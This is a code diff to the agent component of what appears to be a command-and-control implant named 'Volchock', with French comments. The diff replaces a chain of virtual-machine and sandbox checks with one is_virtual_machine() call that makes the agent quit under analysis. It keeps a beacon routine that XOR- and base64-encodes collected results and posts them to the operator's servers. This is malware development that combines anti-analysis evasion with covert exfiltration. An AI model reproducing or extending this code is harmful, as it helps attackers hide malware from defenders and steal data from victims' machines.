@@ -11,11 +11,12 @@
 #include "task.h"
 #include <random>
 #include <ctime>
-#include "detectors.hpp"
-#include <Wbemidl.h>
 #include <intrin.h>
 #include <array>
 using namespace std;
+
+// Déclaration de la fonction de détection
+extern "C" bool is_virtual_machine();
 
 string beakon(const string& data_res) {
     string agent_id = generate_agent_id();
@@ -33,21 +34,20 @@ string beakon(const string& data_res) {
     string result_json = ss.str();
     string encoded = xor_data(result_json, XOR_KEY);
     string b64_encoded = base64_encode(encoded);
-    constexpr int VOLCHOCK_SERVERS_COUNT = sizeof(VOLCHOCK_SERVERS) / sizeof(VOLCHOCK_SERVERS[0]);
-    mt19937 rng((unsigned int)std::time(nullptr));
-    uniform_int_distribution<int> distrib(0, VOLCHOCK_SERVERS_COUNT - 1);
-    int random_index = distrib(rng);
-    string res = http_post(VOLCHOCK_SERVERS[random_index], VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
+    
+    string res = http_post(VOLCHOCK_SERVERS, VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
     return res;
 }
 
 void agent_run() {
     setvbuf(stdout, NULL, _IONBF, 0);
 
-    if (detect::cpu_brand() || detect::device_drivers() || detect::disk_space() || detect::cpu_cores() || detect::memory_amount() || detect::screen_resolution() || detect::bios_version() || detect::cpu_id() || detect::bios_manufacturer() || detect::cpu_hypervisor_bit() ||) {
+    // Utiliser la nouvelle fonction de détection
+    if (is_virtual_machine()) {
+        // Optionnel: message de debug
+        // MessageBoxA(0, "VM detected - exiting", "Volchock", 0);
         return;
     }
-
 
     string register_call = beakon("");
     string result;
@@ -59,7 +59,6 @@ void agent_run() {
 }
 
 int main() {
-    //MessageBoxA(0, "START AGENT !", "Volchock", 0);
     agent_run();
     return 0;
 }
